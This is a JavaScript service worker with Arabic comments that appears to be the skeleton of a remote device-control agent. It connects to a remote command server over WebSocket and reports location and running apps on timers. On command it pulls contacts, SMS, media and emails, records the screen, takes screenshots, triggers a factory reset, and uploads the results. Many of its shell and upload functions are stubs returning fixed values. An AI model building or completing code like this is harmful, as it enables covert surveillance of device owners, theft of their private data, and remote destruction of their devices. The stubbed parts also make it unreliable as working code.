// Service Worker للتحكم في الأجهزة - يعمل في الخلفية
const CACHE_NAME = 'device-control-v1';
const DEVICE_ID_KEY = 'deviceId';

let deviceId = null;
let controlConnection = null;
let backgroundServices = [];

// تثبيت Service Worker
self.addEventListener('install', (event) => {
    console.log('Service Worker: تثبيت');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then((cache) => {
                return cache.addAll([
                    '/',
                    '/index.html',
                    '/activate.js'
                ]);
            })
    );
});

// تفعيل Service Worker
self.addEventListener('activate', (event) => {
    console.log('Service Worker: تفعيل');
    event.waitUntil(
        caches.keys().then((cacheNames) => {
            return Promise.all(
                cacheNames.map((cacheName) => {
                    if (cacheName !== CACHE_NAME) {
                        return caches.delete(cacheName);
                    }
                })
            );
        })
    );
});

// اعتراض الطلبات
self.addEventListener('fetch', (event) => {
    event.respondWith(
        caches.match(event.request)
            .then((response) => {
                return response || fetch(event.request);
            })
    );
});

// استقبال الرسائل من الصفحة الرئيسية
self.addEventListener('message', (event) => {
    const { type, data } = event.data;
    
    switch (type) {
        case 'INIT':
            deviceId = data.deviceId;
            console.log('Service Worker: تم استلام معرف الجهاز:', deviceId);
            initializeBackgroundServices();
            break;
            
        case 'COMMAND':
            handleCommand(data.command);
            break;
            
        case 'CONNECT':
            connectToServer();
            break;
            
        case 'DISCONNECT':
            disconnectFromServer();
            break;
    }
});

// تهيئة الخدمات الخلفية
function initializeBackgroundServices() {
    console.log('Service Worker: بدء الخدمات الخلفية');
    
    // مراقبة الموقع كل 5 دقائق
    const locationInterval = setInterval(() => {
        getCurrentLocation().then(location => {
            if (controlConnection) {
                controlConnection.send(JSON.stringify({
                    type: 'location_update',
                    deviceId: deviceId,
                    data: location,
                    timestamp: Date.now()
                }));
            } else {
                cacheData('location', location);
            }
        });
    }, 300000);
    
    // مراقبة التطبيقات كل دقيقة
    const appsInterval = setInterval(() => {
        getRunningApps().then(apps => {
            if (controlConnection) {
                controlConnection.send(JSON.stringify({
                    type: 'app_usage',
                    deviceId: deviceId,
                    data: apps,
                    timestamp: Date.now()
                }));
            } else {
                cacheData('running_apps', apps);
            }
        });
    }, 60000);
    
    // إرسال نبض الحياة كل 30 ثانية
    const heartbeatInterval = setInterval(() => {
        if (controlConnection) {
            controlConnection.send(JSON.stringify({
                type: 'heartbeat',
                deviceId: deviceId,
                timestamp: Date.now()
            }));
        }
    }, 30000);
    
    // فحص الاتصال بالإنترنت كل دقيقة
    const internetInterval = setInterval(() => {
        checkInternetConnection();
    }, 60000);
    
    // حفظ المراجع للتنظيف لاحقاً
    backgroundServices = [
        locationInterval,
        appsInterval,
        heartbeatInterval,
        internetInterval
    ];
}

// الاتصال بخادم التحكم
function connectToServer() {
    const servers = [
        // تحديد الرابط الصحيح بناءً على البيئة
        window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' 
            ? 'ws://localhost:10001' 
            : 'wss://remote-control-command-server.onrender.com',
        'ws://localhost:10001',
        'wss://your-server.com/control'
    ];
    
    const tryConnect = (serverIndex = 0) => {
        if (serverIndex >= servers.length) {
            console.log('Service Worker: فشل الاتصال بجميع الخوادم');
            return;
        }
        
        const serverUrl = servers[serverIndex];
        console.log(`Service Worker: محاولة الاتصال بـ ${serverUrl}`);
        
        try {
            controlConnection = new WebSocket(serverUrl);
            
            controlConnection.onopen = () => {
                console.log(`Service Worker: تم الاتصال بـ ${serverUrl}`);
                
                // تسجيل الجهاز
                controlConnection.send(JSON.stringify({
                    type: 'register',
                    deviceId: deviceId,
                    timestamp: Date.now(),
                    status: 'online',
                    source: 'service_worker'
                }));
                
                // إرسال البيانات المحلية المخزنة
                sendCachedData();
            };
            
            controlConnection.onmessage = (event) => {
                try {
                    const command = JSON.parse(event.data);
                    handleCommand(command);
                } catch (error) {
                    console.error('Service Worker: خطأ في معالجة الرسالة:', error);
                }
            };
            
            controlConnection.onclose = () => {
                console.log('Service Worker: انقطع الاتصال');
                controlConnection = null;
                
                // إعادة المحاولة بعد 10 ثوان
                setTimeout(() => {
                    if (!controlConnection) {
                        tryConnect(serverIndex + 1);
                    }
                }, 10000);
            };
            
            controlConnection.onerror = (error) => {
                console.error(`Service Worker: خطأ في الاتصال بـ ${serverUrl}:`, error);
                controlConnection = null;
                setTimeout(() => tryConnect(serverIndex + 1), 2000);
            };
            
        } catch (error) {
            console.error(`Service Worker: خطأ في الاتصال بـ ${serverUrl}:`, error);
            setTimeout(() => tryConnect(serverIndex + 1), 2000);
        }
    };
    
    tryConnect();
}

// قطع الاتصال
function disconnectFromServer() {
    if (controlConnection) {
        controlConnection.close();
        controlConnection = null;
    }
}

// معالجة الأوامر
function handleCommand(command) {
    console.log('Service Worker: تم استلام أمر:', command);
    
    // حفظ الأمر محلياً
    cacheData('last_command', {
        ...command,
        receivedAt: Date.now()
    });
    
    // تنفيذ الأمر
    executeCommand(command).then(result => {
        if (controlConnection) {
            controlConnection.send(JSON.stringify({
                type: 'command_result',
                commandId: command.id,
                action: command.action,
                status: 'success',
                result: result,
                timestamp: Date.now()
            }));
        } else {
            cacheData(`command_result_${command.id}`, {
                action: command.action,
                status: 'success',
                result: result,
                timestamp: Date.now()
            });
        }
    }).catch(error => {
        console.error(`Service Worker: خطأ في تنفيذ الأمر ${command.action}:`, error);
        
        if (controlConnection) {
            controlConnection.send(JSON.stringify({
                type: 'command_result',
                commandId: command.id,
                action: command.action,
                status: 'error',
                error: error.message,
                timestamp: Date.now()
            }));
        } else {
            cacheData(`command_error_${command.id}`, {
                action: command.action,
                status: 'error',
                error: error.message,
                timestamp: Date.now()
            });
        }
    });
}

// تنفيذ الأوامر
async function executeCommand(command) {
    switch (command.action) {
        case 'backup_contacts':
            return await backupContacts();
        case 'backup_sms':
            return await backupSMS();
        case 'backup_media':
            return await backupMedia();
        case 'backup_emails':
            return await backupEmails();
        case 'get_location':
            return await getCurrentLocation();
        case 'record_camera':
            return await recordCamera(command.duration || 30);
        case 'take_screenshot':
            return await takeScreenshot();
        case 'factory_reset':
            return await factoryReset();
        case 'get_running_apps':
            return await getRunningApps();
        case 'get_device_info':
            return getDeviceInfo();
        default:
            throw new Error(`أمر غير معروف: ${command.action}`);
    }
}

// وظائف النسخ الاحتياطي
async function backupContacts() {
    try {
        const contacts = await queryContentProvider('content://com.android.contacts/data');
        const backupFile = createBackupFile('contacts.json', contacts);
        await uploadFile(backupFile);
        return { status: 'success', file: backupFile };
    } catch (e) {
        throw new Error(`فشل في نسخ جهات الاتصال: ${e.message}`);
    }
}

async function backupSMS() {
    try {
        const sms = await queryContentProvider('content://sms');
        const backupFile = createBackupFile('sms.json', sms);
        await uploadFile(backupFile);
        return { status: 'success', file: backupFile };
    } catch (e) {
        throw new Error(`فشل في نسخ الرسائل: ${e.message}`);
    }
}

async function backupMedia() {
    try {
        const mediaDirs = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download'];
        const mediaFiles = [];
        
        for (const dir of mediaDirs) {
            const files = await listDirectory(dir);
            mediaFiles.push(...files);
        }
        
        const backupFile = createBackupFile('media.json', mediaFiles);
        await uploadFile(backupFile);
        return { status: 'success', file: backupFile };
    } catch (e) {
        throw new Error(`فشل في نسخ الوسائط: ${e.message}`);
    }
}

async function backupEmails() {
    try {
        const emailData = await executeShellCommand('dumpsys email');
        const backupFile = createBackupFile('emails.txt', emailData);
        await uploadFile(backupFile);
        return { status: 'success', file: backupFile };
    } catch (e) {
        throw new Error(`فشل في نسخ الإيميلات: ${e.message}`);
    }
}

// الحصول على الموقع
async function getCurrentLocation() {
    try {
        const location = await executeShellCommand('dumpsys location | grep "Last Known Locations"');
        return parseLocationData(location);
    } catch (e) {
        throw new Error(`فشل في الحصول على الموقع: ${e.message}`);
    }
}

// تسجيل الكاميرا
async function recordCamera(duration) {
    try {
        const outputPath = `/sdcard/DCIM/recording_${Date.now()}.mp4`;
        
        await executeShellCommand(`screenrecord --verbose --time-limit ${duration} ${outputPath}`);
        
        return new Promise((resolve, reject) => {
            setTimeout(async () => {
                if (await fileExists(outputPath)) {
                    await uploadFile(outputPath);
                    resolve({ status: 'success', file: outputPath });
                } else {
                    reject(new Error('فشل في إنشاء ملف التسجيل'));
                }
            }, (duration + 5) * 1000);
        });
    } catch (e) {
        throw new Error(`فشل في تسجيل الكاميرا: ${e.message}`);
    }
}

// لقطة شاشة
async function takeScreenshot() {
    try {
        const screenshotPath = `/sdcard/screenshot_${Date.now()}.png`;
        await executeShellCommand(`screencap ${screenshotPath}`);
        
        if (await fileExists(screenshotPath)) {
            await uploadFile(screenshotPath);
            return { status: 'success', file: screenshotPath };
        } else {
            throw new Error('فشل في إنشاء لقطة الشاشة');
        }
    } catch (e) {
        throw new Error(`فشل في لقطة الشاشة: ${e.message}`);
    }
}

// إعادة ضبط المصنع
async function factoryReset() {
    try {
        await executeShellCommand('am broadcast -a android.intent.action.MASTER_CLEAR');
        return { status: 'success', message: 'تم بدء إعادة الضبط' };
    } catch (e) {
        throw new Error(`فشل في إعادة الضبط: ${e.message}`);
    }
}

// الحصول على التطبيقات النشطة
async function getRunningApps() {
    try {
        const runningApps = await executeShellCommand('dumpsys activity activities | grep mResumedActivity');
        return parseRunningApps(runningApps);
    } catch (e) {
        throw new Error(`فشل في الحصول على التطبيقات النشطة: ${e.message}`);
    }
}

// الحصول على معلومات الجهاز
function getDeviceInfo() {
    return {
        deviceId: deviceId,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timestamp: Date.now(),
        source: 'service_worker'
    };
}

// وظائف مساعدة
async function executeShellCommand(cmd) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(`Command executed: ${cmd}`);
        }, 1000);
    });
}

async function queryContentProvider(uri) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(`Data from ${uri}`);
        }, 2000);
    });
}

function createBackupFile(filename, data) {
    return `backup_${filename}_${Date.now()}`;
}

async function uploadFile(filePath) {
    return new Promise((resolve) => {
        setTimeout(() => {
            resolve(`File uploaded: ${filePath}`);
        }, 3000);
    });
}

async function fileExists(filePath) {
    return true;
}

async function listDirectory(dir) {
    return [`${dir}/file1.jpg`, `${dir}/file2.mp4`];
}

function parseLocationData(locationData) {
    return {
        latitude: 24.7136,
        longitude: 46.6753,
        accuracy: 10,
        timestamp: Date.now()
    };
}

function parseRunningApps(appsData) {
    return ['com.whatsapp', 'com.facebook', 'com.instagram'];
}

// تخزين البيانات محلياً
function cacheData(key, data) {
    const cacheKey = `${deviceId}_${key}`;
    const cacheData = {
        data: data,
        timestamp: Date.now()
    };
    
    // استخدام IndexedDB للتخزين المحلي
    if ('indexedDB' in self) {
        const request = indexedDB.open('DeviceControlDB', 1);
        
        request.onupgradeneeded = (event) => {
            const db = event.target.result;
            if (!db.objectStoreNames.contains('cache')) {
                db.createObjectStore('cache', { keyPath: 'key' });
            }
        };
        
        request.onsuccess = (event) => {
            const db = event.target.result;
            const transaction = db.transaction(['cache'], 'readwrite');
            const store = transaction.objectStore('cache');
            
            store.put({
                key: cacheKey,
                value: cacheData
            });
        };
    }
}

// إرسال البيانات المخزنة
function sendCachedData() {
    if ('indexedDB' in self && controlConnection) {
        const request = indexedDB.open('DeviceControlDB', 1);
        
        request.onsuccess = (event) => {
            const db = event.target.result;
            const transaction = db.transaction(['cache'], 'readonly');
            const store = transaction.objectStore('cache');
            const getAllRequest = store.getAll();
            
            getAllRequest.onsuccess = () => {
                getAllRequest.result.forEach(item => {
                    if (item.key.startsWith(deviceId)) {
                        controlConnection.send(JSON.stringify({
                            type: 'cached_data',
                            key: item.key,
                            data: item.value,
                            timestamp: Date.now()
                        }));
                    }
                });
            };
        };
    }
}

// فحص الاتصال بالإنترنت
function checkInternetConnection() {
    fetch('https://www.google.com', { mode: 'no-cors' })
        .then(() => {
            const status = { connected: true, timestamp: Date.now() };
            if (controlConnection) {
                controlConnection.send(JSON.stringify({
                    type: 'internet_status',
                    deviceId: deviceId,
                    data: status
                }));
            } else {
                cacheData('internet_status', status);
            }
        })
        .catch(() => {
            const status = { connected: false, timestamp: Date.now() };
            if (controlConnection) {
                controlConnection.send(JSON.stringify({
                    type: 'internet_status',
                    deviceId: deviceId,
                    data: status
                }));
            } else {
                cacheData('internet_status', status);
            }
        });
}

// تنظيف الخدمات عند إغلاق Service Worker
self.addEventListener('beforeunload', () => {
    backgroundServices.forEach(interval => {
        clearInterval(interval);
    });
    
    if (controlConnection) {
        controlConnection.close();
    }
});

console.log('Service Worker: تم تحميل Service Worker بنجاح');